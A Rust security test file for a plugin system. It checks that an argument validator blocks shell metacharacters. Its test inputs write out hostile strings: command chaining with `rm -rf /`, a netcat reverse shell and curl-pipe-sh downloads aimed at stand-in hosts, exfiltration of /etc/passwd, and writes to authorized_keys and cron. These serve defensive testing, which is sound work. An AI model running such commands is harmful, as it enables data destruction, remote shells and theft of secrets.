#![cfg(feature = "plugins-wasm")]

//! Security test: shell metacharacters blocked in CLI arguments.
//!
//! Task US-ZCL-54-3: Verifies acceptance criterion for US-ZCL-54:
//! > Shell metacharacters blocked (semicolon/pipe/ampersand/backtick/dollar/redirect/parens)
//!
//! These tests exercise the `is_safe_argument` function from the security module
//! to ensure shell metacharacters are properly blocked before they could reach
//! CLI command execution in the plugin system.

use zeroclaw::security::{SHELL_METACHARACTERS, is_safe_argument};

// ---------------------------------------------------------------------------
// Core acceptance criterion: each metacharacter type is blocked
// ---------------------------------------------------------------------------

/// AC: Semicolon (;) command separator is blocked.
/// Attack vector: `file.txt; rm -rf /` runs two commands.
#[test]
fn semicolon_blocked() {
    assert!(!is_safe_argument(";"), "bare semicolon must be blocked");
    assert!(
        !is_safe_argument("file; rm -rf /"),
        "semicolon command chaining must be blocked"
    );
    assert!(
        !is_safe_argument("status;id"),
        "no-space semicolon injection must be blocked"
    );
}

/// AC: Pipe (|) operator is blocked.
/// Attack vector: `file.txt | cat /etc/passwd` pipes to another command.
#[test]
fn pipe_blocked() {
    assert!(!is_safe_argument("|"), "bare pipe must be blocked");
    assert!(
        !is_safe_argument("file | cat /etc/passwd"),
        "pipe to command must be blocked"
    );
    assert!(
        !is_safe_argument("status|nc attacker.com 9999"),
        "no-space pipe exfiltration must be blocked"
    );
}

/// AC: Ampersand (&) background/AND operator is blocked.
/// Attack vector: `file.txt & malicious_bg` runs command in background.
/// Attack vector: `file.txt && rm -rf /` runs on success.
#[test]
fn ampersand_blocked() {
    assert!(!is_safe_argument("&"), "bare ampersand must be blocked");
    assert!(
        !is_safe_argument("file & bg_cmd"),
        "background execution must be blocked"
    );
    assert!(
        !is_safe_argument("true && rm -rf /"),
        "AND chaining must be blocked"
    );
    assert!(
        !is_safe_argument("cmd&&evil"),
        "no-space AND chaining must be blocked"
    );
}

/// AC: Backtick (`) command substitution is blocked.
/// Attack vector: ``file`whoami`.txt`` embeds command output.
#[test]
fn backtick_blocked() {
    assert!(!is_safe_argument("`"), "bare backtick must be blocked");
    assert!(
        !is_safe_argument("`whoami`"),
        "backtick command substitution must be blocked"
    );
    assert!(
        !is_safe_argument("file`cat /etc/passwd`.txt"),
        "embedded backtick substitution must be blocked"
    );
}

/// AC: Dollar ($) variable/command expansion is blocked.
/// Attack vector: `$HOME` expands variables, `$(cmd)` runs commands.
#[test]
fn dollar_blocked() {
    assert!(!is_safe_argument("$"), "bare dollar must be blocked");
    assert!(
        !is_safe_argument("$HOME"),
        "variable expansion must be blocked"
    );
    assert!(
        !is_safe_argument("$(whoami)"),
        "command substitution must be blocked"
    );
    assert!(
        !is_safe_argument("${PATH}"),
        "braced variable expansion must be blocked"
    );
    assert!(
        !is_safe_argument("file$IFS/etc/passwd"),
        "IFS injection must be blocked"
    );
}

/// AC: Redirect operators (< >) are blocked.
/// Attack vector: `> /etc/passwd` overwrites files, `< /etc/shadow` reads secrets.
#[test]
fn redirects_blocked() {
    assert!(!is_safe_argument("<"), "bare less-than must be blocked");
    assert!(!is_safe_argument(">"), "bare greater-than must be blocked");
    assert!(
        !is_safe_argument("file > /etc/passwd"),
        "output redirect must be blocked"
    );
    assert!(
        !is_safe_argument("< /etc/shadow"),
        "input redirect must be blocked"
    );
    assert!(
        !is_safe_argument("cmd >> /var/log/secure"),
        "append redirect must be blocked"
    );
    assert!(!is_safe_argument("2>&1"), "stderr redirect must be blocked");
}

/// AC: Parentheses ( ) for subshell execution are blocked.
/// Attack vector: `(rm -rf /)` runs in subshell.
#[test]
fn parens_blocked() {
    assert!(!is_safe_argument("("), "bare open paren must be blocked");
    assert!(!is_safe_argument(")"), "bare close paren must be blocked");
    assert!(
        !is_safe_argument("(subshell)"),
        "subshell execution must be blocked"
    );
    assert!(
        !is_safe_argument("$(nested)"),
        "nested subshell must be blocked"
    );
    assert!(!is_safe_argument("cmd ("), "partial paren must be blocked");
}

// ---------------------------------------------------------------------------
// Additional blocked characters (defense in depth)
// ---------------------------------------------------------------------------

/// Quotes can break out of argument boundaries.
#[test]
fn quotes_blocked() {
    assert!(!is_safe_argument("\""), "double quote must be blocked");
    assert!(!is_safe_argument("'"), "single quote must be blocked");
    assert!(
        !is_safe_argument("file\"breakout"),
        "embedded double quote must be blocked"
    );
    assert!(
        !is_safe_argument("file'breakout"),
        "embedded single quote must be blocked"
    );
}

/// Backslash escape can bypass filters.
#[test]
fn backslash_blocked() {
    assert!(!is_safe_argument("\\"), "bare backslash must be blocked");
    assert!(
        !is_safe_argument("file\\name"),
        "embedded backslash must be blocked"
    );
}

/// Newline acts as command separator.
#[test]
fn newline_blocked() {
    assert!(!is_safe_argument("\n"), "bare newline must be blocked");
    assert!(
        !is_safe_argument("file\nrm -rf /"),
        "newline command injection must be blocked"
    );
}

/// Null byte can truncate strings in C-based systems.
#[test]
fn null_byte_blocked() {
    assert!(!is_safe_argument("\0"), "bare null byte must be blocked");
    assert!(
        !is_safe_argument("file.txt\0.jpg"),
        "null byte extension bypass must be blocked"
    );
}

// ---------------------------------------------------------------------------
// Safe arguments are accepted
// ---------------------------------------------------------------------------

#[test]
fn safe_arguments_accepted() {
    // Simple filenames
    assert!(is_safe_argument("file.txt"));
    assert!(is_safe_argument("my-project"));
    assert!(is_safe_argument("config_v2"));
    assert!(is_safe_argument("README"));

    // Paths (forward slash is allowed)
    assert!(is_safe_argument("src/main.rs"));
    assert!(is_safe_argument("path/to/deeply/nested/file.json"));
    assert!(is_safe_argument("/absolute/path"));

    // Common CLI flags
    assert!(is_safe_argument("--verbose"));
    assert!(is_safe_argument("-v"));
    assert!(is_safe_argument("--output=result.txt"));

    // Git-like arguments
    assert!(is_safe_argument("HEAD~1"));
    assert!(is_safe_argument("origin/main"));
    assert!(is_safe_argument("feature/add-login"));

    // Numeric arguments
    assert!(is_safe_argument("12345"));
    assert!(is_safe_argument("3.14159"));
    assert!(is_safe_argument("-42"));

    // Spaces (allowed - shell quoting handled by Command API)
    assert!(is_safe_argument("file with spaces.txt"));
    assert!(is_safe_argument("My Documents"));

    // Empty string (edge case - allowed, will be filtered elsewhere)
    assert!(is_safe_argument(""));
}

// ---------------------------------------------------------------------------
// Real-world injection patterns
// ---------------------------------------------------------------------------

#[test]
fn real_world_injection_patterns_blocked() {
    // Classic command injection
    assert!(!is_safe_argument("; cat /etc/passwd"));
    assert!(!is_safe_argument("| nc attacker.com 4444 -e /bin/bash"));
    assert!(!is_safe_argument("&& curl http://evil.com/shell.sh | sh"));

    // Data exfiltration
    assert!(!is_safe_argument(
        "$(cat /etc/passwd | base64 | curl -d @- attacker.com)"
    ));
    assert!(!is_safe_argument("`curl http://evil.com?data=$(whoami)`"));

    // File overwrites
    assert!(!is_safe_argument("> /etc/cron.d/evil"));
    assert!(!is_safe_argument(">> ~/.ssh/authorized_keys"));

    // Privilege escalation attempts
    assert!(!is_safe_argument("; chmod +s /bin/bash"));
    assert!(!is_safe_argument("| sudo su -"));

    // Environment manipulation (only strings containing $)
    // Note: "LD_PRELOAD=/tmp/evil.so" doesn't contain metacharacters - it's
    // protected by env_clear() + allowed_env whitelist, not argument validation.
    // See plugin_env_sanitization.rs for env injection protection tests.
    assert!(!is_safe_argument("PATH=/tmp:$PATH")); // $ is blocked

    // Polyglot payloads
    assert!(!is_safe_argument("';sleep${IFS}5;'"));
    assert!(!is_safe_argument("\"$(sleep 5)\""));
}

// ---------------------------------------------------------------------------
// SHELL_METACHARACTERS constant validation
// ---------------------------------------------------------------------------

#[test]
fn shell_metacharacters_constant_contains_all_documented_chars() {
    // Verify the constant includes all characters mentioned in the AC
    let required = [';', '|', '&', '`', '$', '<', '>', '(', ')'];
    for ch in required {
        assert!(
            SHELL_METACHARACTERS.contains(&ch),
            "SHELL_METACHARACTERS must contain '{}'",
            ch
        );
    }
}

#[test]
fn shell_metacharacters_constant_includes_defense_in_depth_chars() {
    // Additional characters for defense in depth
    let defense_chars = ['\'', '"', '\\', '\n', '\0'];
    for ch in defense_chars {
        assert!(
            SHELL_METACHARACTERS.contains(&ch),
            "SHELL_METACHARACTERS should contain '{}' for defense in depth",
            ch.escape_default()
        );
    }
}

#[test]
fn is_safe_argument_rejects_every_metacharacter_individually() {
    for ch in SHELL_METACHARACTERS {
        let arg = format!("prefix{}suffix", ch);
        assert!(
            !is_safe_argument(&arg),
            "is_safe_argument must reject strings containing '{}'",
            ch.escape_default()
        );
    }
}

#[test]
fn is_safe_argument_rejects_bare_metacharacters() {
    for ch in SHELL_METACHARACTERS {
        let arg = ch.to_string();
        assert!(
            !is_safe_argument(&arg),
            "is_safe_argument must reject bare metacharacter '{}'",
            ch.escape_default()
        );
    }
}
